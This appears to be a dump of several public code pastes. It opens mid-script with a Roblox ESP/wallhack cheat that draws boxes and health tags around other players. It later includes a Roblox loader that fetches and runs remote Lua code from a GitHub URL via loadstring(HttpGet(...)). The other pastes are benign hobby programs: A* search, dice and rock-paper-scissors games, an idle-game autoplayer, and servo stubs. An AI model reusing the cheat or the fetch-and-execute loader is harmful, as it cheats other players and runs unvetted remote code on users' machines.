Box.Size = Vector3.new(4, 7, 4)
Box.Color3 = Color3.new(100 / 255, 100 / 255, 100 / 255)
Box.Transparency = 0.7
Box.ZIndex = 0
Box.AlwaysOnTop = true
Box.Visible = true

local NameTag = Instance.new(""BillboardGui"")
NameTag.Name = ""nilNameTag""
NameTag.Enabled = false
NameTag.Size = UDim2.new(0, 200, 0, 50)
NameTag.AlwaysOnTop = true
NameTag.StudsOffset = Vector3.new(0, 1.8, 0)
local Tag = Instance.new(""TextLabel"", NameTag)
Tag.Name = ""Tag""
Tag.BackgroundTransparency = 1
Tag.Position = UDim2.new(0, -50, 0, 0)
Tag.Size = UDim2.new(0, 300, 0, 20)
Tag.TextSize = 20
Tag.TextColor3 = Color3.new(100 / 255, 100 / 255, 100 / 255)
Tag.TextStrokeColor3 = Color3.new(0 / 255, 0 / 255, 0 / 255)
Tag.TextStrokeTransparency = 0.4
Tag.Text = ""nil""
Tag.Font = Enum.Font.SourceSansBold
Tag.TextScaled = false

local LoadCharacter = function(v)
	repeat wait() until v.Character ~= nil
	v.Character:WaitForChild(""Humanoid"")
	local vHolder = Holder:FindFirstChild(v.Name)
	vHolder:ClearAllChildren()
	local b = Box:Clone()
	b.Name = v.Name .. ""Box""
	b.Adornee = v.Character
	b.Parent = vHolder
	local t = NameTag:Clone()
	t.Name = v.Name .. ""NameTag""
	t.Enabled = true
	t.Parent = vHolder
	t.Adornee = v.Character:WaitForChild(""Head"", 5)
	if not t.Adornee then
		return UnloadCharacter(v)
	end
	t.Tag.Text = v.Name
	b.Color3 = Color3.new(v.TeamColor.r, v.TeamColor.g, v.TeamColor.b)
	t.Tag.TextColor3 = Color3.new(v.TeamColor.r, v.TeamColor.g, v.TeamColor.b)
	local Update
	local UpdateNameTag = function()
		if not pcall(function()
			v.Character.Humanoid.DisplayDistanceType = Enum.HumanoidDisplayDistanceType.None
			local maxh = math.floor(v.Character.Humanoid.MaxHealth)
			local h = math.floor(v.Character.Humanoid.Health)
			t.Tag.Text = v.Name .. ""\n"" .. ((maxh ~= 0 and tostring(math.floor((h / maxh) * 100))) or ""0"") .. ""%  "" .. tostring(h) .. ""/"" .. tostring(maxh)
		end) then
			Update:Disconnect()
		end
	end
	UpdateNameTag()
	Update = v.Character.Humanoid.Changed:Connect(UpdateNameTag)
end

local UnloadCharacter = function(v)
	local vHolder = Holder:FindFirstChild(v.Name)
	if vHolder and (vHolder:FindFirstChild(v.Name .. ""Box"") ~= nil or vHolder:FindFirstChild(v.Name .. ""NameTag"") ~= nil) then
		vHolder:ClearAllChildren()
	end
end

local LoadPlayer = function(v)
	local vHolder = Instance.new(""Folder"", Holder)
	vHolder.Name = v.Name
	v.CharacterAdded:Connect(function()
		pcall(LoadCharacter, v)
	end)
	v.CharacterRemoving:Connect(function()
		pcall(UnloadCharacter, v)
	end)
	v.Changed:Connect(function(prop)
		if prop == ""TeamColor"" then
			UnloadCharacter(v)
			wait()
			LoadCharacter(v)
		end
	end)
	LoadCharacter(v)
end

local UnloadPlayer = function(v)
	UnloadCharacter(v)
	local vHolder = Holder:FindFirstChild(v.Name)
	if vHolder then
		vHolder:Destroy()
	end
end

for i,v in pairs(game:GetService(""Players""):GetPlayers()) do
	spawn(function() pcall(LoadPlayer, v) end)
end

game:GetService(""Players"").PlayerAdded:Connect(function(v)
	pcall(LoadPlayer, v)
end)

game:GetService(""Players"").PlayerRemoving:Connect(function(v)
	pcall(UnloadPlayer, v)
end)

game:GetService(""Players"").LocalPlayer.NameDisplayDistance = 0
    end,
 })

 local Button = MainTab:CreateButton({
    Name = ""Box ESP"",
    Callback = function()
        local plr = game.Players.LocalPlayer
        local camera = game.Workspace.CurrentCamera
        
        for i, v in pairs(game.Players:GetChildren()) do
            local Top = Drawing.new(""Line"")
            Top.Visible = false
            Top.From = Vector2.new(0, 0)
            Top.To = Vector2.new(200, 200)
            Top.Color = Color3.fromRGB(255, 0, 0)
            Top.Thickness = 2
            Top.Transparency = 1
        
            local Bottom = Drawing.new(""Line"")
            Bottom.Visible = false
            Bottom.From = Vector2.new(0, 0)
            Bottom.To = Vector2.new(200, 200)
            Bottom.Color = Color3.fromRGB(255, 0, 0)
            Bottom.Thickness = 2
            Bottom.Transparency = 1
        
            local Left = Drawing.new(""Line"")
            Left.Visible = false
            Left.From = Vector2.new(0, 0)
            Left.To = Vector2.new(200, 200)
            Left.Color = Color3.fromRGB(255, 0, 0)
            Left.Thickness = 2
            Left.Transparency = 1
        
            local Right = Drawing.new(""Line"")
            Right.Visible = false
            Right.From = Vector2.new(0, 0)
            Right.To = Vector2.new(200, 200)
            Right.Color = Color3.fromRGB(255, 0, 0)
            Right.Thickness = 2
            Right.Transparency = 1
        
            function ESP()
                local connection
                connection = game:GetService(""RunService"").RenderStepped:Connect(function()
                    if v.Character ~= nil and v.Character:FindFirstChild(""HumanoidRootPart"") ~= nil and v.Name ~= plr.Name  and v.Character.Humanoid.Health > 0 then 
                        local ScreenPos, OnScreen = camera:WorldToViewportPoint(v.Character.HumanoidRootPart.Position)
                        if OnScreen then
                            local Scale = v.Character.Head.Size.Y/2
                            local Size = Vector3.new(2, 3, 0) * (Scale * 2)
                            local humpos = camera:WorldToViewportPoint(v.Character.HumanoidRootPart.Position)
                            local TL = camera:WorldToViewportPoint((v.Character.HumanoidRootPart.CFrame * CFrame.new(Size.X, Size.Y, 0)).p)
                            local TR = camera:WorldToViewportPoint((v.Character.HumanoidRootPart.CFrame * CFrame.new(-Size.X, Size.Y, 0)).p)
                            local BL = camera:WorldToViewportPoint((v.Character.HumanoidRootPart.CFrame * CFrame.new(Size.X, -Size.Y, 0)).p)
                            local BR = camera:WorldToViewportPoint((v.Character.HumanoidRootPart.CFrame * CFrame.new(-Size.X, -Size.Y, 0)).p)
        
                            Top.From = Vector2.new(TL.X, TL.Y)
                            Top.To = Vector2.new(TR.X, TR.Y)
        
                            Left.From = Vector2.new(TL.X, TL.Y)
                            Left.To = Vector2.new(BL.X, BL.Y)
        
                            Right.From = Vector2.new(TR.X, TR.Y)
                            Right.To = Vector2.new(BR.X, BR.Y)
        
                            Bottom.From = Vector2.new(BL.X, BL.Y)
                            Bottom.To = Vector2.new(BR.X, BR.Y)
        
                            if v.TeamColor == plr.TeamColor then
                                Top.Color = Color3.fromRGB(0, 255, 0)
                                Left.Color = Color3.fromRGB(0, 255, 0)
                                Bottom.Color = Color3.fromRGB(0, 255, 0)
                                Right.Color = Color3.fromRGB(0, 255, 0)
                            else 
                                Top.Color = Color3.fromRGB(255, 0, 0)
                                Left.Color = Color3.fromRGB(255, 0, 0)
                                Bottom.Color = Color3.fromRGB(255, 0, 0)
                                Right.Color = Color3.fromRGB(255, 0, 0)
                            end
        
                            Top.Visible = true
                            Left.Visible = true
                            Bottom.Visible = true
                            Right.Visible = true
                        else 
                            Top.Visible = false
                            Left.Visible = false
                            Bottom.Visible = false
                            Right.Visible = false
                        end
                    else 
                        Top.Visible = false
                        Left.Visible = false
                        Bottom.Visible = false
                        Right.Visible = false
                        if game.Players:FindFirstChild(v.Name) == nil then
                            connection:Disconnect()
                        end
                    end
                end)
            end
            coroutine.wrap(ESP)()
        end
        
        game.Players.PlayerAdded:Connect(function(newplr) --Parameter gets the new player that has been added
            local Top = Drawing.new(""Line"")
            Top.Visible = false
            Top.From = Vector2.new(0, 0)
            Top.To = Vector2.new(200, 200)
            Top.Color = Color3.fromRGB(255, 0, 0)
            Top.Thickness = 2
            Top.Transparency = 1
        
            local Bottom = Drawing.new(""Line"")
            Bottom.Visible = false
            Bottom.From = Vector2.new(0, 0)
            Bottom.To = Vector2.new(200, 200)
            Bottom.Color = Color3.fromRGB(255, 0, 0)
            Bottom.Thickness = 2
            Bottom.Transparency = 1
        
            local Left = Drawing.new(""Line"")
            Left.Visible = false
            Left.From = Vector2.new(0, 0)
            Left.To = Vector2.new(200, 200)
            Left.Color = Color3.fromRGB(255, 0, 0)
            Left.Thickness = 2
            Left.Transparency = 1
        
            local Right = Drawing.new(""Line"")
            Right.Visible = false
            Right.From = Vector2.new(0, 0)
            Right.To = Vector2.new(200, 200)
            Right.Color = Color3.fromRGB(255, 0, 0)
            Right.Thickness = 2
            Right.Transparency = 1
        
            function ESP()
                local connection
                connection = game:GetService(""RunService"").RenderStepped:Connect(function()
                    if newplr.Character ~= nil and newplr.Character:FindFirstChild(""HumanoidRootPart"") ~= nil and newplr.Name ~= plr.Name  and newplr.Character.Humanoid.Health > 0 then
                        local ScreenPos, OnScreen = camera:WorldToViewportPoint(newplr.Character.HumanoidRootPart.Position)
                        if OnScreen then
                            local Scale = newplr.Character.Head.Size.Y/2
                            local Size = Vector3.new(2, 3, 0) * (Scale * 2)
                            local humpos = camera:WorldToViewportPoint(newplr.Character.HumanoidRootPart.Position)
                            local TL = camera:WorldToViewportPoint((newplr.Character.HumanoidRootPart.CFrame * CFrame.new(Size.X, Size.Y, 0)).p)
                            local TR = camera:WorldToViewportPoint((newplr.Character.HumanoidRootPart.CFrame * CFrame.new(-Size.X, Size.Y, 0)).p)
                            local BL = camera:WorldToViewportPoint((newplr.Character.HumanoidRootPart.CFrame * CFrame.new(Size.X, -Size.Y, 0)).p)
                            local BR = camera:WorldToViewportPoint((newplr.Character.HumanoidRootPart.CFrame * CFrame.new(-Size.X, -Size.Y, 0)).p)
        
                            Top.From = Vector2.new(TL.X, TL.Y)
                            Top.To = Vector2.new(TR.X, TR.Y)
        
                            Left.From = Vector2.new(TL.X, TL.Y)
                            Left.To = Vector2.new(BL.X, BL.Y)
        
                            Right.From = Vector2.new(TR.X, TR.Y)
                            Right.To = Vector2.new(BR.X, BR.Y)
        
                            Bottom.From = Vector2.new(BL.X, BL.Y)
                            Bottom.To = Vector2.new(BR.X, BR.Y)
        
                            if newplr.TeamColor == plr.TeamColor then
                                Top.Color = Color3.fromRGB(0, 255, 0)
                                Left.Color = Color3.fromRGB(0, 255, 0)
                                Bottom.Color = Color3.fromRGB(0, 255, 0)
                                Right.Color = Color3.fromRGB(0, 255, 0)
                            else 
                                Top.Color = Color3.fromRGB(255, 0, 0)
                                Left.Color = Color3.fromRGB(255, 0, 0)
                                Bottom.Color = Color3.fromRGB(255, 0, 0)
                                Right.Color = Color3.fromRGB(255, 0, 0)
                            end
        
                            Top.Visible = true
                            Left.Visible = true
                            Bottom.Visible = true
                            Right.Visible = true
                        else 
                            Top.Visible = false
                            Left.Visible = false
                            Bottom.Visible = false
                            Right.Visible = false
                        end
                    else 
                        Top.Visible = false
                        Left.Visible = false
                        Bottom.Visible = false
                        Right.Visible = false
                        if game.Players:FindFirstChild(newplr.Name) == nil then
                            connection:Disconnect()
                        end
                    end
                end)
            end
            coroutine.wrap(ESP)()
        end)
    end,
 })"
4ZhXAaJs,Servo Control rev_02,pleasedontcode,Arduino,Thursday 2nd of May 2024 01:30:45 PM CDT,"/********* Pleasedontcode.com **********

	Pleasedontcode thanks you for automatic code generation! Enjoy your code!

	- Terms and Conditions:
	You have a non-exclusive, revocable, worldwide, royalty-free license
	for personal and commercial use. Attribution is optional; modifications
	are allowed, but you're responsible for code maintenance. We're not
	liable for any loss or damage. For full terms,
	please visit pleasedontcode.com/termsandconditions.

	- Project: Servo Control
	- Source Code compiled for: ESP32 DevKit V1
	- Source Code created on: 2024-05-02 18:26:24

********* Pleasedontcode.com **********/

/****** SYSTEM REQUIREMENTS *****/
/****** SYSTEM REQUIREMENT 1 *****/
	/* stream video over webserver, save videos and pic */
	/* to sd card, pan camera using the servo to follow */
	/* objects also do face recognition, set video */
	/* resolutio to 480p */
/****** END SYSTEM REQUIREMENTS *****/

/****** DEFINITION OF LIBRARIES *****/
#include <Deneyap_Servo.h> // https://github.com/deneyapkart/deneyap-servo-arduino-library

/****** FUNCTION PROTOTYPES *****/
void setup(void);
void loop(void);
void updateOutputs(void);

/***** DEFINITION OF PWM OUTPUT PINS *****/
const uint8_t sg90_Servomotor_PWMSignal_PIN_D4 = 4;

/***** DEFINITION OF OUTPUT RAW VARIABLES *****/
/***** used to store raw data *****/
uint8_t sg90_Servomotor_PWMSignal_PIN_D4_rawData = 0;

/***** DEFINITION OF OUTPUT PHYSICAL VARIABLES *****/
/***** used to store data after characteristic curve transformation *****/
float sg90_Servomotor_PWMSignal_PIN_D4_phyData = 0.0;

/****** DEFINITION OF LIBRARIES CLASS INSTANCES*****/
Servo myservo; // Servo object instance from Deneyap Servo library

void setup(void)
{
    // put your setup code here, to run once:
    pinMode(sg90_Servomotor_PWMSignal_PIN_D4, OUTPUT);

    myservo.attach(9); // Attaching servo motor to pin 9

    // Additional setup for system requirements
    // Initialize SD card for saving videos and pictures
    // Set video resolution to 480p
    // Perform face recognition setup
}

void loop(void)
{
    // put your main code here, to run repeatedly:
    updateOutputs(); // Refresh output data

    // Additional code for system requirements
    // Stream video over webserver
    // Pan camera using the servo to follow objects
}

void updateOutputs(void)
{
    analogWrite(sg90_Servomotor_PWMSignal_PIN_D4, sg90_Servomotor_PWMSignal_PIN_D4_rawData);
}
"
d6n8rPrN,A*,maxim_shlyahtin,C++,Thursday 2nd of May 2024 01:28:29 PM CDT,"#include <iostream>
#include <vector>
#include <map>
#include <queue>
#include <cmath>
#include <climits>

using namespace std;

// Структура для хранения информации о вершине
struct Vertex {
    double g = numeric_limits<double>::max(); // Стоимость пути от начальной вершины до данной
    double h; // Эвристическая оценка стоимости пути от данной вершины до конечной
    double f; // Общая стоимость пути (g + h)
    char parent; // Родительская вершина в пути
};

// Структура для сравнения вершин в очереди
struct Compare {
    bool operator()(const pair<char, Vertex>& a, const pair<char, Vertex>& b) {
        return a.second.f > b.second.f;
    }
};

// Функция для вычисления эвристической оценки
double heuristic(char a, char b) {
    return abs(a - b);
}

string aStar(map<char, vector<pair<char, double>>>& graph, char start, char goal) {
    map<char, Vertex> vertices;
    priority_queue<pair<char, Vertex>, vector<pair<char, Vertex>>, Compare> pq;

    // Инициализация начальной вершины
    vertices[start].g = 0;
    vertices[start].h = heuristic(start, goal);
    vertices[start].f = vertices[start].g + vertices[start].h;
    vertices[start].parent = ' ';
    pq.push({ start, vertices[start] });

    while (!pq.empty()) {
        char current = pq.top().first;
        pq.pop();

        if (current == goal) {
            string path;
            while (current != ' ') {
                path = current + path;
                current = vertices[current].parent;
            }
            return path;
        }

        for (auto& neighbor : graph[current]) {
            char next = neighbor.first;
            double tentative_g = vertices[current].g + neighbor.second;

            //cout << next << ' ' << tentative_g << ' ' << vertices[next].g << '\n';

            if (tentative_g < vertices[next].g) {
                vertices[next].g = tentative_g;
                vertices[next].h = heuristic(next, goal);
                vertices[next].f = vertices[next].g + vertices[next].h;
                vertices[next].parent = current;
                pq.push({ next, vertices[next] });
            }
        }

        //cout << current << '\n';
    }

    return ""No path found"";
}

int main() {
    map<char, vector<pair<char, double>>> graph;
    char start, goal;
    cin >> start >> goal;

    char from, to;
    double weight;
    while (cin >> from >> to >> weight) {
        graph[from].insert(graph[from].end(), {make_pair(to, weight)});
    }

    /*for (const auto& vert : graph) {
        std::cout << ""vert = "" << vert.first << '\n';
        for (const auto& pair : vert.second) {
            std::cout << "" end vert = "" << pair.first << "" weight = "" << pair.second;
        }
        std::cout << ""\n"";
    }*/

    string path = aStar(graph, start, goal);
    cout << path << endl;

    return 0;
}
"
KjK66J99,Servo Control rev_01,pleasedontcode,Arduino,Thursday 2nd of May 2024 01:23:12 PM CDT,"/********* Pleasedontcode.com **********

	Pleasedontcode thanks you for automatic code generation! Enjoy your code!

	- Terms and Conditions:
	You have a non-exclusive, revocable, worldwide, royalty-free license
	for personal and commercial use. Attribution is optional; modifications
	are allowed, but you're responsible for code maintenance. We're not
	liable for any loss or damage. For full terms,
	please visit pleasedontcode.com/termsandconditions.

	- Project: Servo Control
	- Source Code NOT compiled for: ESP32 DevKit V1
	- Source Code created on: 2024-05-02 18:21:58

********* Pleasedontcode.com **********/

/****** SYSTEM REQUIREMENTS *****/
/****** SYSTEM REQUIREMENT 1 *****/
	/* stream video over webserver, save videos and pic */
	/* to sd card, pan camera using the servo to follow */
	/* objects also do face recognition, set video */
	/* resolutio to 480p */
/****** END SYSTEM REQUIREMENTS *****/

/****** DEFINITION OF LIBRARIES *****/
#include <Deneyap_Servo.h> // https://github.com/deneyapkart/deneyap-servo-arduino-library

/****** FUNCTION PROTOTYPES *****/
void setup(void);
void loop(void);
void updateOutputs(void);

/***** DEFINITION OF PWM OUTPUT PINS *****/
const uint8_t sg90_Servomotor_PWMSignal_PIN_D4 = 4;

/***** DEFINITION OF OUTPUT RAW VARIABLES *****/
/***** used to store raw data *****/
uint8_t sg90_Servomotor_PWMSignal_PIN_D4_rawData = 0;

/***** DEFINITION OF OUTPUT PHYSICAL VARIABLES *****/
/***** used to store data after characteristic curve transformation *****/
float sg90_Servomotor_PWMSignal_PIN_D4_phyData = 0.0;

/****** DEFINITION OF LIBRARIES CLASS INSTANCES*****/
Servo myservo; // Servo object instance from Deneyap Servo library

void setup(void)
{
    // put your setup code here, to run once:
    pinMode(sg90_Servomotor_PWMSignal_PIN_D4, OUTPUT);

    myservo.attach(D9); // Attaching servo motor to pin D9

    // Additional setup for system requirements
    // Initialize SD card for saving videos and pictures
    // Set video resolution to 480p
    // Perform face recognition setup
}

void loop(void)
{
    // put your main code here, to run repeatedly:
    updateOutputs(); // Refresh output data

    // Additional code for system requirements
    // Stream video over webserver
    // Pan camera using the servo to follow objects
}

void updateOutputs(void)
{
    analogWrite(sg90_Servomotor_PWMSignal_PIN_D4, sg90_Servomotor_PWMSignal_PIN_D4_rawData);
}
"
Rt9gPM3w,The Ascension Tree Auto,spotky,JavaScript,Thursday 2nd of May 2024 01:20:17 PM CDT,"// ==UserScript==
// @name         Auto Game
// @namespace    http://tampermonkey.net/
// @version      2024-05-02
// @description  try to take over the world!
// @author       You
// @match        https://ascensiontree.semenar.am/
// @icon         https://www.google.com/s2/favicons?sz=64&domain=semenar.am
// @grant        none
// ==/UserScript==

(function() {
'use strict';
function autoTick() {
  for (const layer of player.layers) autoLayer(layer);
}

function isAllUpgradeBought(layer) {
    return Object.values(layer.upgrades).every(upgrade => upgrade.bought)
}

function autoLayer(layer) {
  if (
      layer.left_branch &&
      layer.right_branch &&
      isAllUpgradeBought(layer)
  ) return;

  if (!layer.left_branch) layer.buyLeft();
  if (!layer.right_branch) layer.buyRight();
  const production = layer.calculateProduction(0);
  if (
    layer.canPrestige() &&
    isAllUpgradeBought(layer.parent_layer) &&
    (
        layer.points.eq(0) ||
        layer.prestigeGain().div(production.max(1)).gte(3) && Math.random() > 0.5 ||
        production.eq(0)
    )
  ) {
    layer.prestige();
  }
  for (const upgradeKey in layer.upgrades) {
    const upgrade = layer.upgrades[upgradeKey];
    if (!upgrade.canBuy() || upgrade.bought) continue;
    upgrade.buy();
  }
}

setInterval(autoTick, 50);
})();"
LTRduM2R,RSP tkinter + OOP,plarmi,Python,Thursday 2nd of May 2024 01:20:01 PM CDT,"from tkinter import *
from random import randint

class Main(Frame):
    def __init__(self, root):
        super().__init__(root)
        self.startUI(root)

    def startUI(self, root):
        btn = Button(root, text=""Камень"", font=(""Times New Roman"", 15), command=lambda x=1: self.btn_click(x))
        btn2 = Button(root, text=""Ножницы"", font=(""Times New Roman"", 15), command=lambda x=2: self.btn_click(x))
        btn3 = Button(root, text=""Бумага"", font=(""Times New Roman"", 15), command=lambda x=3: self.btn_click(x))

        btn.place(x=10, y=100, width=120, height=50)
        btn2.place(x=155, y=100, width=120, height=50)
        btn3.place(x=300, y=100, width=120, height=50)

        self.lbl = Label(root, text=""Начало игры!"", bg=""white"", font=(""Times New Roman"", 21, ""bold""))
        self.lbl.place(x=150, y=25)

        self.win = self.drow = self.lose = 0

        self.lbl2 = Label(root, justify=""left"", font=(""Times New Roman"", 13), bg=""white"", text=f""Побед: {self.win}\n""
                                                                                f""Проигрышей: {self.lose}\n""
                                                                                f""Ничей: {self.drow}"")
        self.lbl2.place(x=5, y=5)

    def btn_click(self, choice):
        # 1 - камень, 2 - ножницы, 3 - бумага
        comp_choice = randint(1, 3)
        print(comp_choice)

        if choice == comp_choice:
            self.drow += 1
            self.lbl.config(text=""Ничья"")
        elif comp_choice == 1 and choice == 3 or comp_choice == 2 and choice == 1 or comp_choice == 3 and choice == 2:
            self.win += 1
            self.lbl.config(text=""Победа"")
        else:
            self.lose += 1
            self.lbl.config(text=""Проигрыш"")

        self.lbl2.config(text=f""Побед: {self.win}\n""
                              f""Проигрышей: {self.lose}\n""
                              f""Ничей: {self.drow}"")

        del comp_choice



window = Tk()
window.geometry(""430x160+200+200"")
window.title(""Камень, ножницы, бумага"")
window.resizable(False, False)
window.config(bg=""white"")

window2 = Tk()
window2.geometry(""430x160+200+200"")
window2.title(""Камень, ножницы, бумага2"")
window2.resizable(False, False)
window2.config(bg=""white"")

app = Main(window)
app.pack()

app2 = Main(window2)
app2.pack()

window.mainloop()"
59qwkiNG,Roblox Script Loader/Auth,quikzyYTbtw,Lua,Thursday 2nd of May 2024 01:18:14 PM CDT,"--[[
This script loads and executes different scripts based on the game's place ID, with the option to turn off game check for loading universal scripts

The script loads and executes scripts based on the place ID of the Roblox game you're playing.
It verifies the place ID to ensure the correct game is being played. If the place ID doesn't match, authentication fails.
If there's an error in the script or authentication fails, the main script doesn't load.
]]


-- Config
getgenv().gamesConfig = {
    {
        gameName = ""A literal baseplate"",
        placeId = 4483381587,
        ConfigScript = [[ --script in here]]
    },
    {
        gameName = ""Game Placeholder"",
        placeId = 0000000000, 
        ConfigScript = [[ --script in here  ]]
    },
    -- Add more games if needed!
}

getgenv().logo = [[
    Welcome to
        ____   ____                             _________            .__        __          
        \   \ /   /____   ____   _______  ___  /   _____/ ___________|__|______/  |_  ______
         \   Y   // __ \ /    \ /  _ \  \/  /  \_____  \_/ ___\_  __ \  \____ \   __\/  ___/
          \     /\  ___/|   |  (  <_> >    <   /        \  \___|  | \/  |  |_> >  |  \___ \ 
           \___/  \___  >___|  /\____/__/\_ \ /_______  /\___  >__|  |__|   __/|__| /____  >
                      \/     \/            \/         \/     \/         |__|             \/ 
                                        discord.gg/
         [*] made by venox.w#0

    ]]

getgenv().ScriptName = ""Script Name Here""                         --name of your script
getgenv().gamechecker = true                                      --game placeid checker on/off (true/false)
getgenv().UniversalScript = [[ -- script in here ]]               --script to execute when gamechecker off

-- Loader
loadstring(game:HttpGet((""https://raw.githubusercontent.com/venoxhh/LoaderV1/main/Loader.lua"")))()
"
Nf2NHSnw,Yahtzee Game,makispaiktis,Python,Thursday 2nd of May 2024 01:14:42 PM CDT,"# 1. Global variables
valid_combs = [""1. Ones"", ""2. Twos"", ""3. Threes"", ""4. Fours"", ""5. Fives"", ""6. Sixes"", ""7. Three of a kind"", ""8. Four of a kind"", ""9. Full House"", ""10.Small Straight"", ""11. Large Straight"", ""12. Yahtzee"", ""13. Chance""]
valid_rules = [""Sum of aces"", ""Sum of twos"", ""Sum of threes"", ""Sum of fours"", ""Sum of fives"", ""Sum of sixes"", ""Sum of all dice"", ""Sum of all dice"", ""25"", ""30"", ""40"", ""50"", ""Sum of all dice""]
LEN = len(valid_combs)


# 2. Auxiliary Functions
def count(pentada):
    # Count how many 1s, 2s, ...., 6s there are
    counters = list()
    for i in range(1, 7):
        counters.append(pentada.count(i))
    return counters

def score(pentada, rule):

    if rule in list(range(1, 7)):
        return rule * pentada.count(rule)

    elif rule == 7:
      # Three of a kind
      counters = count(pentada)
      return sum(pentada) if ((3 in counters) or (4 in counters) or (5 in counters)) else 0

    elif rule == 8:
        # Four of a kind
        counters = count(pentada)
        return sum(pentada) if ((4 in counters) or (5 in counters)) else 0

    elif rule == 9:
        # Full House
        counters = count(pentada)
        counters = sorted(counters, reverse=True)
        return 25 if counters == [3, 2, 0, 0, 0, 0] else 0

    elif rule == 10:
        # Small Straight = 1-2-3-4 or 2-3-4-5 or 3-4-5-6
        pentada = set(pentada)
        valids = [{1,2,3,4}, {2,3,4,5}, {3,4,5,6}]
        for valid in valids:
            if valid.issubset(pentada):
                return 30
        return 0

    elif rule == 11:
        # Large Straight = 1-2-3-4-5 or 2-3-4-5-6
        counters = count(pentada)
        counters = sorted(counters, reverse=True)
        return 40 if counters == [1, 1, 1, 1, 1, 0] else 0

    elif rule == 12:
        # Yahtzee
        counters = count(pentada)
        counters = sorted(counters, reverse=True)
        return 50 if counters == [5, 0, 0, 0, 0, 0] else 0

    elif rule == 13:
        # Chance
        return sum(pentada)

num_combs = list(range(1, LEN + 1))
def decide(num_combs_used, dices, player, points):
    declaration = """"
    for num_comb in num_combs:
        if num_comb not in num_combs_used:
            declaration = declaration + valid_combs[num_comb - 1] + "", ""
    if declaration:
        declaration = declaration[:-2]
    print(""!!!! Available combinations !!!!\n"", declaration)

    rule = int(input(""Select combination: ""))
    while rule in num_combs_used:
        rule = int(input(""Select combination: ""))

    num_combs_used.append(rule)
    new_points = score(dices, rule)
    COMB = valid_combs[rule - 1]
    STR = COMB[3:]
    points = points + new_points
    print(f""{player} scored {new_points} points with {STR} ----> Total points = {points}"")
    return points, num_combs_used


# 3. Playing Functions
from random import randrange
import copy
def roll(N):
    return [randrange(1, 7) for i in range(N)]

rerolls_permitted = 2

def show(dices, round, rerolls_used, player):
    # print(40 * ""*"")
    print(f""{rerolls_permitted - rerolls_used} rerolls left for {player} in round {round}:"")
    dices_str = [str(elem) for elem in dices]
    dice_show = "" - "".join(dices_str)
    print(f""{player} threw:\t {dice_show}\n"")

def rerolls0(player, rerolls_used, N, round, points, num_combs_used):
    print(f""\n\n----> {player}'s turn ({points} points)    -    Combinations used = {num_combs_used}"")
    dices = roll(N)
    show(dices, round, rerolls_used, player)
    return dices

def rerolls1(player, rerolls_used, N, round, dices, positions):
    positions = positions.split("", "")
    positions = [int(position) for position in positions]
    new_rolls = roll(len(positions))
    # Checking if positions are between 1 and N - Invalid input, then dices are not changed
    for position in positions:
        if position not in list(range(1, N+1)):
            return dices
    # Changing the dices
    for i in range(len(positions)):
        index = positions[i] - 1
        value = new_rolls[i]
        dices[index] = value
    show(dices, round, rerolls_used, player)
    return dices


# MAIN FUNCTION
players = [""Thomas"", ""PC""]
num_combs_used_list = [[], []]
points_list = [0, 0]
N = 5
bold_start = ""\033[1m""
bold_end = ""\033[0;0m""

for round in list(range(1, LEN + 1)):
    print(20 * ""*"", 20 * ""*"", sep=f"" Round {round} "", end=""\n"")
    for i, player in enumerate(players):

          num_combs_used = num_combs_used_list[i]
          points = points_list[i]

          rerolls_used = 0
          dices = rerolls0(player, rerolls_used, N, round, points, num_combs_used)
          positions = input(""Positions to reroll: "")
          if positions == """":
              # print(""Time to decide (0 rerolls used)\n"")
              points, num_combs_used = decide(num_combs_used, dices, player, points)
              continue
          else:
              rerolls_used = 1

          dices = rerolls1(player, rerolls_used, N, round, dices, positions)
          positions = input(""Positions to reroll:\n"")
          if positions == """":
              # print(""Time to decide (1 reroll used)\n"")
              points, num_combs_used = decide(num_combs_used, dices, player, points)
              continue
          else:
              rerolls_used = 2

          dices = rerolls1(player, rerolls_used, N, round, dices, positions)
          points, num_combs_used = decide(num_combs_used, dices, player, points)

          # UPDATE THE VALUES OF LISTS
          num_combs_used_list[i] = num_combs_used
          points_list[i] = points
    print(""\n\n\n\n"")"
